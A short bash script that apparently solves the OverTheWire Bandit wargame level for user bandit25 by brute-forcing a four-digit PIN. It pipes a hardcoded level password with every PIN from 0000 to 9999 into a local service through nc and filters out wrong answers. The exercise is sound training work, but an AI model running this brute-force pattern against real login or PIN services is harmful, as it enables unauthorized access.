#!/bin/bash

pw24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

for i in {0000..9999}; do
	echo "$i" > pin.txt #OPTIONAL
	echo "$pw24 $i" 
done | nc localhost 30002 | grep -v "I am the pincode checker for user bandit25." | grep -v Wrong